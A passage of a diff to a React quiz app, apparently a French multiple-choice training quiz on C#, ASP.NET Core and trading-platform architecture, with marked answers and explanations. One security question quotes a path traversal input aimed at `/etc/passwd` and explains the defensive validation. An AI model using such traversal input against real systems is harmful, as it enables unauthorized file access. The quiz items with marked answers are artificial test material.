-      "explanation": "Flux complet du booking Autocall dans MAPS : (1) JWT validé, `BookingRequest` validé (FluentValidation). (2) ISIN résolu depuis Redis (hit) ou Sophis (miss) — prérequis bloquant. (3) Pricing Monte Carlo Heston pour le prix théorique et les Greeks (validation pré-trade). (4) Sophis COM/API : création du trade dans le référentiel (ISIN, notional, maturité, barrières). (5) SQL Server : insertion dans `Trades` avec userId, timestamp, ISIN, Greeks — audit trail MiFID II immuable. (6) `channel.BasicPublish(\"trading\", \"trade.booked\", payload)` — le blotter React affiche le nouveau trade, le RMS recalcule les limites, le PMS met à jour les positions. Chaque composant correspond à un élément de la stack technique de la mission."
-    },
-    {
-      "question": "[Erreur contextuelle + Architecture] Le service de pricing MAPS expose `GET /api/v1/pricing/volatility-surface` qui retourne la surface complète (50KB JSON) à chaque appel depuis le blotter toutes les secondes pour 100 traders. Problème et correction.",
-      "options": [
-        "Aucun problème — REST GET est toujours optimal.",
-        "100 traders × 1 req/sec × 50KB = 5MB/sec de polling inutile. Correction : WebSocket push ou Server-Sent Events (SSE) depuis le service MAPS — la surface est poussée uniquement quand elle change (toutes les 30s), réduisant le trafic de ×30 et la latence de 1s à quasi-zéro.",
-        "La correction est de compresser le JSON à 5KB.",
-        "Utiliser HTTP/2 multiplexing résout entièrement le problème."
-      ],
-      "answer": "100 traders × 1 req/sec × 50KB = 5MB/sec de polling inutile. Correction : WebSocket push ou Server-Sent Events (SSE) depuis le service MAPS — la surface est poussée uniquement quand elle change (toutes les 30s), réduisant le trafic de ×30 et la latence de 1s à quasi-zéro.",
-      "explanation": "Polling anti-pattern en CIB : 100 traders qui polling toutes les secondes génèrent 100 req/sec sur le service de vol — serveur chargé inutilement, données souvent identiques entre deux requêtes (la surface ne change que toutes les 30s). Solution WebSocket (ASP.NET Core SignalR ou `System.Net.WebSockets`) : le service MAPS push la surface uniquement lors de la recalibration. Latence quasi-zéro (push immédiat vs polling à 1s). Charge réseau : 1 push toutes les 30s × 50KB = ~1.7KB/s. SignalR dans MAPS est standard pour les blotters temps réel."
-    },
-    {
-      "question": "[Nommage inversé + C#] Un mécanisme garantit que tous les services enregistrés dans le DI container ASP.NET Core reçoivent leurs dépendances sans les instancier eux-mêmes, et permet de les remplacer par des mocks en test. Quel est ce mécanisme ?",
-      "options": [
-        "Le pattern Service Locator — `ServiceLocator.Current.GetInstance<T>()`",
-        "L'Injection de dépendances par constructeur (Constructor Injection) via `IServiceCollection` — couplage minimal, testabilité maximale, cycle de vie contrôlé (Singleton/Scoped/Transient).",
-        "Le pattern Singleton statique — `Instance` property sur chaque service.",
-        "La réflexion .NET — `Activator.CreateInstance(typeof(T))`"
-      ],
-      "answer": "L'Injection de dépendances par constructeur (Constructor Injection) via `IServiceCollection` — couplage minimal, testabilité maximale, cycle de vie contrôlé (Singleton/Scoped/Transient).",
-      "explanation": "DI container ASP.NET Core : `services.AddScoped<IIsinService, IsinService>()` + `services.AddSingleton<ISophisAdapter, SophisAdapter>()`. Le framework instancie et injecte automatiquement. Avantages : (1) Le service ne connaît pas ses dépendances concrètes (DIP). (2) Test unitaire : `new IsinService(mock.Object, mockCache.Object)` — injection manuelle du mock. (3) Cycle de vie : Singleton (une instance, VolSurface cache), Scoped (par requête HTTP, identité trader), Transient (nouveau à chaque injection, PricingRequest). Service Locator (anti-pattern) = le service s'appelle lui-même `ServiceLocator.Get<T>()` — couplage caché, non testable."
-    },
-    {
-      "question": "[Thème ↔ Principe] Quel principe garantit que l'ajout d'un nouveau type de produit (ex: Asian Option) dans le moteur MAPS ne nécessite ni modification de `PricingEngine` ni régression sur les options existantes ?",
-      "options": [
-        "SRP — chaque classe a une seule responsabilité",
-        "OCP + Polymorphisme + DIP ensemble : `AsianOption : BaseOption` avec `override Price()` + `PricingEngine` dépend de `IPricingModel` + factory enregistre `AsianOption` dans DI. Zéro ligne modifiée dans le moteur existant.",
-        "LSP uniquement — la substitution garantit la non-régression",
-        "ISP — les interfaces sont séparées par fonctionnalité"
-      ],
-      "answer": "OCP + Polymorphisme + DIP ensemble : `AsianOption : BaseOption` avec `override Price()` + `PricingEngine` dépend de `IPricingModel` + factory enregistre `AsianOption` dans DI. Zéro ligne modifiée dans le moteur existant.",
-      "explanation": "Triple principe pour l'extensibilité du moteur MAPS : OCP = `PricingEngine` est fermé à la modification, ouvert à l'extension. Polymorphisme = `Parallel.ForEach(book, opt => opt.Price(md))` appelle automatiquement `AsianOption.Price()` sans `if/switch`. DIP = le moteur dépend de `BaseOption`/`IPricingModel` (abstractions), jamais des implémentations concrètes. Résultat : ajouter `AsianOption` = créer la classe, enregistrer dans DI, déployer. Les 200 tests unitaires des options existantes continuent de passer — zéro régression. C'est la définition opérationnelle du 'refactoring du code' dans la mission."
-    },
-    {
-      "question": "[Erreur contextuelle + Sécurité CIB] Une API REST MAPS accepte `?model=BlackScholes&underlyingId=../../../../etc/passwd` comme paramètre. Quel type d'attaque et quelle correction ?",
-      "options": [
-        "Pas d'attaque — les paramètres URL sont toujours sécurisés.",
-        "Path traversal / injection via `../` : si le paramètre est utilisé dans un accès fichier ou une requête, un attaquant peut accéder à des ressources non prévues. Correction : whitelist stricte des valeurs autorisées + validation enum pour `model` + `Guid.TryParse()` pour `underlyingId`.",
-        "Le seul risque est une erreur 404 si le fichier n'existe pas.",
-        "HTTPS empêche ce type d'attaque."
-      ],
-      "answer": "Path traversal / injection via `../` : si le paramètre est utilisé dans un accès fichier ou une requête, l'attaquant peut accéder à des ressources non prévues. Correction : whitelist stricte des valeurs autorisées + validation enum pour `model` + `Guid.TryParse()` pour `underlyingId`.",
-      "explanation": "Path traversal en CIB : si `underlyingId` est utilisé dans `File.ReadAllText($\"/data/instruments/{underlyingId}.json\")`, l'input `../../../../etc/passwd` retournerait `/etc/passwd`. Même risque pour les requêtes SQL si non paramétrées. Corrections pour l'API MAPS : (1) `model` → validation enum : `if (!Enum.TryParse<PricingModel>(request.Model, out var model)) return BadRequest()`. (2) `underlyingId` → `Guid.TryParse(id, out var guid)` ou regex `[A-Z0-9]{6,12}`. (3) FluentValidation sur `BookingRequest`. (4) Ne jamais utiliser un paramètre externe directement dans un chemin de fichier ou une requête non paramétrée. Defense in depth."
-    },
-    {
-      "question": "[Multi-concepts] Dans le contexte de la mission 'optimisation des performances du service de référentiel de données : Multithreading + Gestion de la mémoire', proposez une architecture complète pour réduire la latence de 500ms à < 10ms.",
-      "options": [
-        "Migrer vers une base de données NoSQL.",
-        "Index SQL covering + `IDistributedCache` Redis (cache-aside, TTL 4h) + `async/await` Dapper + `IMemoryCache` L1 (TTL 30s) + `ConcurrentDictionary` pour les lookups ISIN les plus fréquents + `Span<T>` pour le parsing des réponses + BenchmarkDotNet pour valider.",
-        "Augmenter le nombre de CPUs du serveur SQL.",
-        "Transformer toutes les requêtes en stored procedures."
-      ],
-      "answer": "Index SQL covering + `IDistributedCache` Redis (cache-aside, TTL 4h) + `async/await` Dapper + `IMemoryCache` L1 (TTL 30s) + `ConcurrentDictionary` pour les lookups ISIN les plus fréquents + `Span<T>` pour le parsing des réponses + BenchmarkDotNet pour valider.",
-      "explanation": "Architecture de cache multi-niveau (L1/L2/L3) pour le référentiel : L1 = `ConcurrentDictionary` en mémoire locale (< 0.1ms, pour les 100 ISIN les plus fréquents). L2 = `IMemoryCache` (< 0.5ms, tous les ISIN du jour). L3 = Redis `IDistributedCache` (< 2ms, partagé entre instances). L4 = SQL Server avec covering index (10-50ms, uniquement en miss). Miss path : SQL → Redis → MemoryCache → ConcurrentDictionary. Hit path L1 : 0.1ms. `async/await` Dapper libère les threads pendant l'I/O SQL. `Span<T>` évite les allocations dans le parsing. BenchmarkDotNet mesure chaque couche. 500ms → < 1ms en hit L1 = ×500 d'amélioration. Exactement 'optimisation des performances + multithreading + gestion de la mémoire'."
-    },
-    {
-      "question": "[Ordre de dépendance + Réglementation] Dans le cadre MiFID II, quel prérequis technique doit absolument être en place avant la mise en production du service de booking MAPS ?",
-      "options": [
-        "L'interface Angular du blotter doit être déployée.",
-        "L'audit trail complet (structured logging immuable, archivage SQL/Kafka, identité trader, ISIN, notional, timestamp microsecondes, traçabilité des modifications) doit être opérationnel et testé avant le premier trade en production.",
-        "DataSynapse doit être entièrement migré vers .NET 8.",
-        "Le pipeline Azure DevOps doit déployer automatiquement toutes les heures."
-      ],
-      "answer": "L'audit trail complet (structured logging immuable, archivage SQL/Kafka, identité trader, ISIN, notional, timestamp microsecondes, traçabilité des modifications) doit être opérationnel et testé avant le premier trade en production.",
-      "explanation": "MiFID II est un prérequis non-négociable à la mise en production : l'article 25 impose la conservation de toutes les transactions (ordre, modification, annulation) avec un horodatage précis, l'identité complète du trader, les caractéristiques de l'instrument. Sanction en cas d'absence : l'AMF/FCA peut suspendre l'activité de trading. Ordre de dépendance : sans audit trail, le service ne peut pas être mis en production légalement. L'audit trail dans MAPS = `_logger.LogInformation` structuré + `INSERT INTO Trades (AuditLog)` SQL + event Kafka `TradeBooked` persisté (immuable, rejouable). Tests obligatoires : vérifier que chaque booking produit un enregistrement complet dans les 3 couches."
+      "answer": "Feature branch : build + tests unitaires + code coverage > 80% + SonarQube. Release branch : feature pipeline + tests d'intégration (Testcontainers) + docker build/push → ACR + déploiement UAT + smoke tests + gate approbation manuelle (Risk IT + Compliance) + déploiement prod + rollback automatique si health check échoue.",
+      "explanation": "Pipelines différenciés en CIB : feature branches = feedback rapide pour le développeur (< 5min). La gate SonarQube (code quality) bloque les PRs avec vulnérabilités. Release branches = pipeline complet avec Testcontainers (SQL Server + RabbitMQ réels), docker multi-stage, push ACR (Azure Container Registry). Gate manuelle obligatoire en CIB : le déploiement en production d'un service de booking nécessite l'approbation Risk IT (impact sur les limites) et Compliance (MiFID II). Rollback automatique : si `GET /health/ready` échoue 3 fois après déploiement, Kubernetes revient à l'image précédente — conformité SOX (ségrégation des rôles, traçabilité des déploiements)."
     }
   ]
 };
@@ -670,14 +575,9 @@ const renderInlineTokens = (text, keyPrefix) => {
     if (part.startsWith("`") && part.endsWith("`")) {
       return (
         <code key={`${keyPrefix}-${idx}`} style={{
-          display: 'inline',
-          backgroundColor: '#eef2f7',
-          padding: '1px 5px',
-          borderRadius: '3px',
-          fontFamily: 'monospace',
-          color: '#e01e5a',
-          fontWeight: 'bold',
-          fontSize: '13px'
+          display: 'inline', backgroundColor: '#eef2f7', padding: '1px 5px',
+          borderRadius: '3px', fontFamily: 'monospace', color: '#e01e5a',
+          fontWeight: 'bold', fontSize: '13px'
         }}>
           {part.slice(1, -1)}
         </code>
@@ -693,24 +593,16 @@ const renderInlineTokens = (text, keyPrefix) => {
 const renderFormattedText = (text) => {
   if (!text) return null;
   let cleanText = text
-    .replace(/\r?\n- /g, " ◆ ")
-    .replace(/\r?\n• /g, " ◆ ")
-    .replace(/\r?\n/g, " ")
-    .replace(/\.-\s*\*\*/g, " ◆ **")
-    .replace(/-\s*\*\*/g, " ◆ **");
-
+    .replace(/\r?\n- /g, " ◆ ").replace(/\r?\n• /g, " ◆ ").replace(/\r?\n/g, " ")
+    .replace(/\.-\s*\*\*/g, " ◆ **").replace(/-\s*\*\*/g, " ◆ **");
   if (cleanText.startsWith(" ◆ ")) cleanText = cleanText.substring(3);
   if (cleanText.startsWith("- ")) cleanText = cleanText.substring(2);
-
   const segments = cleanText.split(" ◆ ");
-
   return (
     <span style={{ display: 'block', lineHeight: '1.7' }}>
       {segments.map((segment, segIdx) => (
         <span key={segIdx} style={{ display: 'block', marginBottom: segIdx < segments.length - 1 ? '6px' : '0' }}>
-          {segIdx > 0 && (
-            <span style={{ color: '#1a73e8', fontWeight: 'bold', marginRight: '5px' }}>◆</span>
-          )}
+          {segIdx > 0 && <span style={{ color: '#1a73e8', fontWeight: 'bold', marginRight: '5px' }}>◆</span>}
           {renderInlineTokens(segment, `seg-${segIdx}`)}
         </span>
       ))}
@@ -751,14 +643,13 @@ const Results = ({ scores }) => {
       <h3>🎯 Score : {totalScore} / {totalQuestions}</h3>
       <p>✅ Moyen : {scores.moyen}/{questions.moyen.length} | ✅ Avancé : {scores.avance}/{questions.avance.length} | ✅ Expert : {scores.expert}/{questions.expert.length}</p>
       {totalScore >= Math.floor(totalQuestions * 0.6)
-        ? <h3 className="success">🚀 Mission CIB Pricing Pre-Trade maîtrisée !</h3>
-        : <p className="fail">📚 Révisez C#, dérivés actions et architecture CIB.</p>
-      }
+        ? <h3 className="success">🚀 Infrastructure REST API CIB maîtrisée — Mission MAPS prête !</h3>
+        : <p className="fail">📚 Révisez l'API REST, le multithreading C# et l'architecture microservices CIB.</p>}
     </div>
   );
 };
 
-const CIBPricingPreTradeQCM = () => {
+const CIBRestApiInfraQCM = () => {
   const [level, setLevel] = useState("basic");
   const [currentSlide, setCurrentSlide] = useState(0);
   const [currentQuestion, setCurrentQuestion] = useState(0);
@@ -769,26 +660,19 @@ const CIBPricingPreTradeQCM = () => {
 
   const handleNextQuestion = useCallback(() => {
     const qs = questions[level];
-    if (currentQuestion + 1 < qs.length) {
-      setCurrentQuestion(q => q + 1);
-      setTimeLeft(25);
-      setMessage("");
-    } else {
-      if (level === "moyen") { setLevel("avance"); }
-      else if (level === "avance") { setLevel("expert"); }
-      else { setShowResult(true); }
-      setCurrentQuestion(0);
-      setTimeLeft(25);
-      setMessage("");
+    if (currentQuestion + 1 < qs.length) { setCurrentQuestion(q => q + 1); setTimeLeft(25); setMessage(""); }
+    else {
+      if (level === "moyen") setLevel("avance");
+      else if (level === "avance") setLevel("expert");
+      else setShowResult(true);
+      setCurrentQuestion(0); setTimeLeft(25); setMessage("");
     }
   }, [level, currentQuestion]);;
 
   useEffect(() => {
     if (level !== "basic" && !showResult && !message) {
-      if (timeLeft > 0) {
-        const t = setTimeout(() => setTimeLeft(t2 => t2 - 1), 1000);
-        return () => clearTimeout(t);
-      } else handleNextQuestion();
+      if (timeLeft > 0) { const t = setTimeout(() => setTimeLeft(t2 => t2 - 1), 1000); return () => clearTimeout(t); }
+      else handleNextQuestion();
     }
   }, [timeLeft, level, showResult, message, handleNextQuestion]);
 
@@ -797,10 +681,7 @@ const CIBPricingPreTradeQCM = () => {
       const i = setInterval(() => {
         setCurrentSlide(prev => {
           if (prev + 1 < basicSlides.length) return prev + 1;
-          setLevel("moyen");
-          setCurrentQuestion(0);
-          setTimeLeft(25);
-          return 0;
+          setLevel("moyen"); setCurrentQuestion(0); setTimeLeft(25); return 0;
         });
       }, 20000);
       return () => clearInterval(i);
@@ -810,12 +691,8 @@ const CIBPricingPreTradeQCM = () => {
   const handleAnswerClick = (option) => {
     if (message) return;
     const current = questions[level][currentQuestion];
-    if (option === current.answer) {
-      setScores(p => ({ ...p, [level]: p[level] + 1 }));
-      setMessage("✅ Correct !");
-    } else {
-      setMessage(`❌ ${current.answer}\n\nℹ️ ${current.explanation}`);
-    }
+    if (option === current.answer) { setScores(p => ({ ...p, [level]: p[level] + 1 })); setMessage("✅ Correct !"); }
+    else { setMessage(`❌ ${current.answer}\n\nℹ️ ${current.explanation}`); }
     setTimeout(handleNextQuestion, 4000);
   };
 
@@ -824,21 +701,13 @@ const CIBPricingPreTradeQCM = () => {
       {showResult ? <Results scores={scores} /> : (
         <div>
           <h4 className="subtitle" style={{ fontSize: '10px', margin: '0 0 6px 0' }}>
-            CIB Pricing Pre-Trade 🔹 {level === "basic"
+            CIB REST API & Infrastructure 🔹 {level === "basic"
               ? `Slide ${currentSlide + 1}/${basicSlides.length}`
-              : `QCM ${level.toUpperCase()} — Q${currentQuestion + 1}/${questions[level].length}`
-            }
+              : `QCM ${level.toUpperCase()} — Q${currentQuestion + 1}/${questions[level].length}`}
           </h4>
-          {level === "basic" ? (
-            <Flashcard slide={basicSlides[currentSlide]} />
-          ) : (
-            <QuestionCard
-              question={questions[level][currentQuestion].question}
-              options={questions[level][currentQuestion].options}
-              onAnswerClick={handleAnswerClick}
-              timeLeft={timeLeft}
-            />
-          )}
+          {level === "basic"
+            ? <Flashcard slide={basicSlides[currentSlide]} />
+            : <QuestionCard question={questions[level][currentQuestion].question} options={questions[level][currentQuestion].options} onAnswerClick={handleAnswerClick} timeLeft={timeLeft} />}
           {message && <p className="message" style={{ whiteSpace: 'pre-wrap', marginTop: '8px' }}>{message}</p>}
         </div>
       )}
@@ -846,4 +715,4 @@ const CIBPricingPreTradeQCM = () => {
   );
 };
 
-export default CIBPricingPreTradeQCM;
+export default CIBRestApiInfraQCM;
